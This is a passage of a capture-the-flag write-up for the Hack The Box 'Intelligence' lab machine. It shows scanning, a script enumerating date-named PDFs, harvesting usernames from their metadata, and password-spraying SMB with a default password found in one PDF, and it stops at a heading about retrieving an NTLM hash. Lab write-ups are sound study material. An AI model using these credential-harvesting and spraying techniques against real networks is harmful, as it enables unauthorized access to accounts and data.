<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="[map[name:MindYourPrivacy]]">
<meta name="description" content="Short description of your site here" />
<meta name="keywords" content=", untagged" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://0xade1.github.io/devdraft/posts/2021/10/htb-intelligence/" />


    <title>
        
            HTB - Intelligence :: Poney Island  â€” Welcome to Pwnie Island
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://0xade1.github.io/devdraft/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://0xade1.github.io/devdraft/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://0xade1.github.io/devdraft/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://0xade1.github.io/devdraft/favicon-16x16.png">
    <link rel="manifest" href="https://0xade1.github.io/devdraft/site.webmanifest">
    <link rel="mask-icon" href="https://0xade1.github.io/devdraft/safari-pinned-tab.svg" color="#1b1c1d">
    <link rel="shortcut icon" href="https://0xade1.github.io/devdraft/favicon.ico">
    <meta name="msapplication-TileColor" content="#1b1c1d">
    <meta name="theme-color" content="#1b1c1d">



<meta itemprop="name" content="HTB - Intelligence">
<meta itemprop="description" content="Short description of your site here"><meta itemprop="datePublished" content="2021-10-23T21:33:15+08:00" />
<meta itemprop="dateModified" content="2021-10-23T21:33:15+08:00" />
<meta itemprop="wordCount" content="3831"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
<meta itemprop="keywords" content="untagged," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://0xade1.github.io/devdraft"/>

<meta name="twitter:title" content="HTB - Intelligence"/>
<meta name="twitter:description" content="Short description of your site here"/>




    <meta property="og:title" content="HTB - Intelligence" />
<meta property="og:description" content="Short description of your site here" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xade1.github.io/devdraft/posts/2021/10/htb-intelligence/" /><meta property="og:image" content="https://0xade1.github.io/devdraft"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-10-23T21:33:15+08:00" />
<meta property="article:modified_time" content="2021-10-23T21:33:15+08:00" />







    <meta property="article:published_time" content="2021-10-23 21:33:15 &#43;0800 &#43;0800" />








    </head>

    
        <body>
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://0xade1.github.io/devdraft/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text"># cd /draft/</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://0xade1.github.io/devdraft/about/">About</a></li><li><a href="https://0xade1.github.io/devdraft/categories/">Categories</a></li><li><a href="https://0xade1.github.io/devdraft/posts/">Posts</a></li><li><a href="https://0xade1.github.io/devdraft/series/">Series</a></li><li><a href="https://0xade1.github.io/devdraft/tags/">Tags</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-lin      ecap="round" stroke-linejoin="round" class="feather feather-calendar">
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
  <line x1="16" y1="2" x2="16" y2="6"></line>
  <line x1="8" y1="2" x2="8" y2="6"></line>
  <line x1="3" y1="10" x2="21" y2="10"></line>
</svg>

  2021-10-23 


  
 |

      

      

      

      

      

    </div>

    <article>
      <h1 class="post-title">
        <a href="https://0xade1.github.io/devdraft/posts/2021/10/htb-intelligence/">HTB - Intelligence</a>
      </h1>

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://0xade1.github.io/devdraft/tags/untagged/">untagged</a></span>
        
    </p>


    </div>

      
        <div class="post-excerpt">Short description of your site here</div>
      

      

      <div class="post-content">
        <h2 id="reckon">Reckon</h2>
<h3 id="port-scan">port scan</h3>
<pre><code>rustscan -a 10.10.10.248 -t 2000 -- -Pn -A -sCV
[..]
Open 10.10.10.248:53
Open 10.10.10.248:80
Open 10.10.10.248:88
Open 10.10.10.248:135
Open 10.10.10.248:139
Open 10.10.10.248:389
Open 10.10.10.248:445
Open 10.10.10.248:464
Open 10.10.10.248:593
Open 10.10.10.248:636

nmap -p53,80,88,135,139,389,445,464,593,636 -sCV -A 10.10.10.248
[..]
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
80/tcp open http Microsoft IIS httpd 10.0
| http-methods:
|\_ Potentially risky methods: TRACE
|\_http-server-header: Microsoft-IIS/10.0
|\_http-title: Intelligence
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-10-23 20:31:43Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|\_Not valid after: 2022-04-19T00:43:16
|\_ssl-date: 2021-10-23T20:32:32+00:00; +7h00m01s from scanner time.
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|\_Not valid after: 2022-04-19T00:43:16
|\_ssl-date: 2021-10-23T20:32:31+00:00; +7h00m00s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre>
<h3 id="dns-tcp53">DNS TCP/53</h3>
<p>DNS exploration did not reveal anything new. Zone transfer failed and 10.10.10.48 is not even able to resolve its name:</p>
<pre><code>nslookup
&gt; server 10.10.10.248
Default server: 10.10.10.248
Address: 10.10.10.248#53
&gt; 10.10.10.248
** server can't find 248.10.10.10.in-addr.arpa: SERVFAIL
</code></pre>
<p>dig</p>
<pre><code>dig dc.intelligence.htb @10.10.10.248
[..]
dc.intelligence.htb.    1200    IN      A       10.10.10.248
</code></pre>
<p>dnsenum</p>
<pre><code>dnsenum --dnsserver 10.10.10.248 \
-f /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt \
-o scans/dnsenum-bitquark-intelligence.htb intelligence.htb
dnsenum VERSION:1.2.6
[..]
intelligence.htb.                        600      IN    A        10.10.10.248
dc.intelligence.htb.                     1200     IN    A        10.10.10.248
</code></pre>
<h3 id="http-tcp80">http TCP/80</h3>
<p>There is two dummy pdfs available on the homepage, nothing else:</p>
<ul>
<li><a href="http://intelligence.htb/documents/2020-01-01-upload.pdf">http://intelligence.htb/documents/2020-01-01-upload.pdf</a></li>
<li><a href="http://intelligence.htb/documents/2020-12-15-upload.pdf">http://intelligence.htb/documents/2020-12-15-upload.pdf</a></li>
</ul>
<pre tabindex="0"><code>$ gobuster dir -u http://intelligence.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 30
/documents (Status: 301)
[..]
$ gobuster vhost -u http://intelligence.htb -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 30
</code></pre><p>The documents follow a certain pattern: YYYY-mm-dd-upload.pdf, let&rsquo;s try every days in year 2020 with this dummp_pdf.py script:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> shutil
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://intelligence.htb/documents/&#39;</span>
</span></span><span style="display:flex;"><span>folder <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;documents&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> m <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">13</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> d <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">1</span>,<span style="color:#bd93f9">32</span>):
</span></span><span style="display:flex;"><span>        filename <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;2020-</span><span style="color:#f1fa8c">%02d</span><span style="color:#f1fa8c">-</span><span style="color:#f1fa8c">%02d</span><span style="color:#f1fa8c">-upload.pdf&#39;</span> <span style="color:#ff79c6">%</span> (m, d)
</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>url<span style="color:#f1fa8c">}{</span>filename<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>, stream<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> r<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">200</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;[DOWNLOAD] </span><span style="color:#f1fa8c">{</span>url<span style="color:#f1fa8c">}{</span>filename<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;./</span><span style="color:#f1fa8c">{</span>folder<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/</span><span style="color:#f1fa8c">{</span>filename<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>, <span style="color:#f1fa8c">&#39;wb&#39;</span>) <span style="color:#ff79c6">as</span> f:
</span></span><span style="display:flex;"><span>                r<span style="color:#ff79c6">.</span>raw<span style="color:#ff79c6">.</span>decode_content <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>                shutil<span style="color:#ff79c6">.</span>copyfileobj(r<span style="color:#ff79c6">.</span>raw, f)
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pdf-extraction">PDF extraction</h2>
<p>The script download 84 documents, and looking at meta data, we can get possible names from the Creator metadata:</p>
<pre><code>$ exiftool documents/2020-01-01-upload.pdf
[..]
Creator                         : William.Lee
</code></pre>
<p>Looking at strings, allows to retrieve Creator names:</p>
<pre><code>$ python3 dump_pdf.py
$ strings * | grep Creator | cut -d'(' -f2 | cut -d')' -f1 | sort | uniq -c
  2 Anita.Roberts
  2 Brian.Baker
  1 Brian.Morris
  2 Daniel.Shelton
  1 Danny.Matthews
  1 Darryl.Harris
  5 David.Mcbride
  3 David.Reed
  2 David.Wilson
  5 Ian.Duncan
  2 Jason.Patterson
  4 Jason.Wright
  2 Jennifer.Thomas
  2 Jessica.Moody
  6 John.Coleman
  8 Jose.Williams
  2 Kaitlyn.Zimmerman
  2 Kelly.Long
  3 Nicole.Brock
  2 Richard.Williams
  3 Samuel.Richardson
  2 Scott.Scott
  4 Stephanie.Young
 84 TeX
  2 Teresa.Williamson
  1 Thomas.Hall
  3 Thomas.Valenzuela
  2 Tiffany.Molina
  3 Travis.Evans
  2 Veronica.Patel
  5 William.Lee
</code></pre>
<p>The content is mainly latin words, but to be sure and build a dictionary, I will convert those pdf into text files.</p>
<p>It may be cleaner to use exiftool but strings was faster:</p>
<pre><code>for i in documents/* ; do exiftool $i | grep Creator | cut -d':' -f2 &amp;&amp; done
</code></pre>
<h3 id="pdf-text-extraction">PDF Text extraction</h3>
<p>It is a bit tedious to open 84 files, let&rsquo;s convert into TEXT files then eliminate those containing latin words:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> glob
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> PyPDF2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pdfs <span style="color:#ff79c6">=</span> glob<span style="color:#ff79c6">.</span>glob(<span style="color:#f1fa8c">&#34;./documents/*pdf&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> pdf <span style="color:#ff79c6">in</span> pdfs:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(pdf)
</span></span><span style="display:flex;"><span>    pdfFileObj <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(pdf, <span style="color:#f1fa8c">&#39;rb&#39;</span>)
</span></span><span style="display:flex;"><span>    pdfReader <span style="color:#ff79c6">=</span> PyPDF2<span style="color:#ff79c6">.</span>PdfFileReader(pdfFileObj)
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(pdfReader<span style="color:#ff79c6">.</span>numPages)
</span></span><span style="display:flex;"><span>    pageObj <span style="color:#ff79c6">=</span> pdfReader<span style="color:#ff79c6">.</span>getPage(<span style="color:#bd93f9">0</span>)
</span></span><span style="display:flex;"><span>    text <span style="color:#ff79c6">=</span> pageObj<span style="color:#ff79c6">.</span>extractText()
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(text)
</span></span><span style="display:flex;"><span>    pdfFileObj<span style="color:#ff79c6">.</span>close()
</span></span></code></pre></td></tr></table>
</div>
</div><p>We find only 2 interesting document:</p>
<pre><code>$ python3 pdf2txt.py
$ pip3 install PyPDF2
[..]
./documents/2020-06-04-upload.pdf
[..]
./documents/2020-12-30-upload.pdf
</code></pre>
<p>Note 1</p>
<pre><code>New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
</code></pre>
<p>Note 2</p>
<pre><code>Internal IT Update
There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our service accounts.
</code></pre>
<p>Another way to extract text from PDF is to use textract</p>
<pre tabindex="0"><code>import textract

if len(sys.argv) &gt; 1:
    print(sys.argv[1])
    text = textract.process(sys.argv[1], method=&#39;pdfminer&#39;)
</code></pre><p>However it requires a lot more to install:</p>
<pre><code>$ brew cask install xquartz
$ brew install poppler antiword unrtf tesseract swig
$ pip3 install textract
</code></pre>
<h3 id="samba-tcp445-enumeration">samba TCP/445 Enumeration</h3>
<p>I was not able to login samba shares anonymously:</p>
<pre><code>smbclient -N -L 10.10.10.248
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
</code></pre>
<p>Let&rsquo;s try with our new list of users:</p>
<pre><code>strings * | grep Creator | cut -d'(' -f2 | cut -d')' -f1 | sort | uniq &gt; list_users.txt
$ for i in `cat list_users.txt`; do echo NewIntelligenceCorpUser9876 | smbclient -U $i -L \\\\intelligence.htb ; done
Enter WORKGROUP\Anita.Roberts's password:
session setup failed: NT_STATUS_LOGON_FAILUR
[..]
Enter WORKGROUP\Tiffany.Molina's password:

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    IT              Disk
    NETLOGON        Disk      Logon server share
    SYSVOL          Disk      Logon server share
    Users           Disk
SMB1 disabled -- no workgroup available
Enter WORKGROUP\Travis.Evans's password
[..]
</code></pre>
<h2 id="samba-as-tiffany">Samba as Tiffany</h2>
<p>We visit the Users folder, and we can find the flag:</p>
<pre><code>smbclient -U Tiffany.Molina //intelligence.htb/Users
Enter WORKGROUP\Tiffany.Molina's password:
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; ls
  .                                  DR        0  Mon Apr 19 09:20:26 2021
  ..                                 DR        0  Mon Apr 19 09:20:26 2021
  Administrator                       D        0  Mon Apr 19 08:18:39 2021
  All Users                         DHS        0  Sat Sep 15 15:21:46 2018
  Default                           DHR        0  Mon Apr 19 10:17:40 2021
  Default User                      DHS        0  Sat Sep 15 15:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 15:11:27 2018
  Public                             DR        0  Mon Apr 19 08:18:39 2021
  Ted.Graves                          D        0  Mon Apr 19 09:20:26 2021
  Tiffany.Molina                      D        0  Mon Apr 19 08:51:46 2021

                3770367 blocks of size 4096. 1423943 blocks available
smb: \&gt; cd Tiffany.Molina
smb: \Tiffany.Molina\&gt; cd Desktop
smb: \Tiffany.Molina\Desktop\&gt; dir
  .                                  DR        0  Mon Apr 19 08:51:46 2021
  ..                                 DR        0  Mon Apr 19 08:51:46 2021
  user.txt                           AR       34  Fri Oct 22 19:56:55 2021
smb: \Tiffany.Molina\Desktop\&gt; get user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \Tiffany.Molina\Desktop\&gt;
smb: \Tiffany.Molina\Desktop\&gt; !cat user.txt
4fc77e796f250c65ad1daf4be098bbb1
</code></pre>
<p>A friendly alternative to smbclient is to Mount the cifs shares for easier navigation, or use smbmount:</p>
<pre><code>sudo apt-get install cifs-utils
mkdir /mnt
sudo mount -t cifs //10.10.10.248/Users /mnt -o username=Tiffany.Molina,password=NewIntelligenceCorpUser9876
cat /mnt/Tiffany.Molina/Desktop/user.tx
sudo umount /mnt
sudo mount -t cifs //10.10.10.248/IT /mnt -o username=Tiffany.Molina,password=NewIntelligenceCorpUser9876
cat /mnt/downdetector.ps1
sudo umount /mnt
</code></pre>
<p>I am not able to login with evil-winrm:</p>
<pre><code>ruby evil-winrm.rb -i intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876
[..]
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
Error: Exiting with code 1
</code></pre>
<p>smbmap works better then smbclient to explore faster:</p>
<pre><code>$ smbmap -H intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876
[+] Finding open SMB ports....
[+] User SMB session established on intelligence.htb...
[+] IP: intelligence.htb:445    Name: unknown
    Disk                                                    Permissions     Comment
    ----                                                    -----------     -------
    ADMIN$                                                  NO ACCESS       Remote Admin
    C$                                                      NO ACCESS       Default share
    .
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    InitShutdown
    fr--r--r--                5 Mon Jan  1 07:36:42 1601    lsass
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    ntsvcs
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    scerpc
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-394-0
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    epmapper
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-1bc-0
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    LSM_API_service
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    eventlog
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-2d0-0
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    atsvc
    fr--r--r--                4 Mon Jan  1 07:36:42 1601    wkssvc
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-4bc-0
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-24c-0
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-24c-1
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    RpcProxy\49691
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    69a91eae92e8a000
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    RpcProxy\593
    fr--r--r--                4 Mon Jan  1 07:36:42 1601    srvsvc
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    netdfs
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    vgauth-service
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    efsrpc
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-244-0
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    W32TIME_ALT
    fr--r--r--                3 Mon Jan  1 07:36:42 1601    cert
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-988-0
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-990-0
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
    fr--r--r--                1 Mon Jan  1 07:36:42 1601    Winsock2\CatalogChangeListener-9a8-0
    IPC$                                                    READ ONLY       Remote IPC
    .
    dr--r--r--                0 Mon Apr 19 08:50:58 2021    .
    dr--r--r--                0 Mon Apr 19 08:50:58 2021    ..
    fr--r--r--             1046 Mon Apr 19 08:50:58 2021    downdetector.ps1
    IT                                                      READ ONLY
    .
    dr--r--r--                0 Mon Apr 19 08:42:14 2021    .
    dr--r--r--                0 Mon Apr 19 08:42:14 2021    ..
    NETLOGON                                                READ ONLY       Logon server share
    .
    dr--r--r--                0 Mon Apr 19 08:42:14 2021    .
    dr--r--r--                0 Mon Apr 19 08:42:14 2021    ..
    dr--r--r--                0 Mon Apr 19 08:42:14 2021    intelligence.htb
    SYSVOL                                                  READ ONLY       Logon server share
    .
    dw--w--w--                0 Mon Apr 19 09:20:26 2021    .
    dw--w--w--                0 Mon Apr 19 09:20:26 2021    ..
    dr--r--r--                0 Mon Apr 19 08:18:39 2021    Administrator
    dr--r--r--                0 Mon Apr 19 11:16:30 2021    All Users
    dw--w--w--                0 Mon Apr 19 10:17:40 2021    Default
    dr--r--r--                0 Mon Apr 19 11:16:30 2021    Default User
    fr--r--r--              174 Mon Apr 19 11:15:17 2021    desktop.ini
    dw--w--w--                0 Mon Apr 19 08:18:39 2021    Public
    dr--r--r--                0 Mon Apr 19 09:20:26 2021    Ted.Graves
    dr--r--r--                0 Mon Apr 19 08:51:46 2021    Tiffany.Molina
    Users                                                   READ ONLY
</code></pre>
<p>There is a file downdetector.ps1 which sounds like the notification script in case of outage mentionned in the second note.</p>
<pre><code>smbclient -U Tiffany.Molina //intelligence.htb/IT
Enter WORKGROUP\Tiffany.Molina's password:
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Mon Apr 19 08:50:55 2021
  ..                                  D        0  Mon Apr 19 08:50:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 08:50:55 2021

                3770367 blocks of size 4096. 1422663 blocks available
smb: \&gt; get downdetector.ps1
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (4.5 KiloBytes/sec) (average 4.5 KiloBytes/sec)
smb: \&gt; !cat downdetector.ps1
</code></pre>
<h2 id="retrieve-teds-ntlm-hash">Retrieve Ted&rsquo;s NTLM hash</h2>
<p>downdetector.ps1:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
